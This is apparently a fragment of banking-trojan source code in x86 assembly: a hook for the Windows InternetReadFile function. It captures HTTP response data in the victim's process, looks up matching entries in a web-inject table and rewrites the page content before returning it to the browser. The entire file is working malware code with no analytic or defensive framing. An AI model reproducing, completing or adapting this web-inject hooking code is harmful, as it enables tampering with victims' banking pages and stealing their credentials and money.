
.code

;; ==================================================================================================== ;;
;; hInternetReadFile is a InternetReadFile handler procedure                                            ;;
;; ==================================================================================================== ;;
hInternetReadFile proc uses ebx ecx edi esi p1, p2, p3, p4 : dword
	local  dwAvailable : dword
	local  dwBytesRead : dword



	GetBaseDelta ebx


	invokx  &ArrayKeyPos[ebx], lpReadBuffersArray[ebx], p1
	jmpnz eax, @giveback	; give back


	mov  eax, lpWebInjectsData[ebx]
	add  eax, 4				;; injects data ptr
	invokx  &GetInject[ebx], p1, eax
	jmpz eax, @real			;; collecting not need


	invokx  &ArrayKeyBuff[ebx], lpReadBuffersArray[ebx], p1
	jmpz eax, @real			;; failed to alloc collecting buffer

	mov  esi, [eax+4]		;; ptr to data len
	lea  edi, [esi+4]		;; ptr to data start

	invokx  &ArrayKeyPos[ebx], lpSockHandlesArray[ebx], 0
	mov  ecx, p1
	mov  [eax], ecx

	invokx  _InternetSetStatusCallback[ebx], p1, &InternetStatusCallback[ebx]
	mov  lpRealCallbackProc[ebx], eax

	m2m  dwAvailable, p3
	jmp  @readmore


@available:
	invokx  _InternetQueryDataAvailable[ebx], p1, &dwAvailable, 0, 0
	jmpnz eax, @F
	invokx  &Pending[ebx], p1	;; ERROR_IO_PENDING
	jmp  @available
@@:

	cmp  dwAvailable, 0
	je   @webinject		;; no more data available


@readmore:
	mov  ecx, BUFFERLEN-RESERVE
	sub  ecx, [esi]
	jmpz ecx, @webinject	;; if no more space in buffer to collect data
	cmp  ecx, dwAvailable
	jae  @F					;; if enought space in buff
	mov  dwAvailable, ecx	;; not enought space in buff


@@:	mov  dwBytesRead, 0
	invokx  _InternetReadFile[ebx], p1, edi, dwAvailable, &dwBytesRead
	jmpnz eax, @F
	invokx  &Pending[ebx], p1	;; ERROR_IO_PENDING
	jmp  @B
@@:

	mov  eax, dwBytesRead
	add  [esi], eax		;; new data len
	add  edi, eax		;; shift data end pointer
	sub  dwAvailable, eax
	cmp  dwAvailable, 0
	jne  @readmore		;; read more available data

	jmp  @available		;; get available data len


@webinject:
	invokx  &WebInject[ebx], p1, esi


@giveback:
	invokx  &ArrayKeyPos[ebx], lpReadBuffersArray[ebx], p1
	mov  esi, [eax+4]	;; ptr to data len
	lea  edi, [esi+4]	;; ptr to data start


	;; return data to caller
	mov  ecx, [esi]		;; data len
	cmp  ecx, p3
	jbe  @F
	mov  ecx, p3
@@:	invokx  &strcpyn[ebx], p2, edi, ecx
	mov  eax, p4		;; lpdwNumberOfBytesRead
	mov  [eax], ecx


	sub  [esi], ecx		;; new data len
	mov  eax, [esi]		;; new data len
	jmple eax, @endgive	;; no more data to give back


	;; shift data
	add  ecx, edi		;; ptr to new data start
	invokx  &strcpyn[ebx], edi, ecx, eax
	jmp  @end


@endgive:
	invokx  &ArrayKeyDel[ebx], lpSockHandlesArray[ebx], p1
	invokx  &ArrayKeyDel[ebx], lpReadBuffersArray[ebx], p1
	invokx  _InternetSetStatusCallback[ebx], p1, lpRealCallbackProc[ebx]


@end:
	xor  eax, eax
	inc  eax
	jmp  @ret


@real:
	invokx  _InternetReadFile[ebx], p1, p2, p3, p4

@ret:
	ret
hInternetReadFile endp

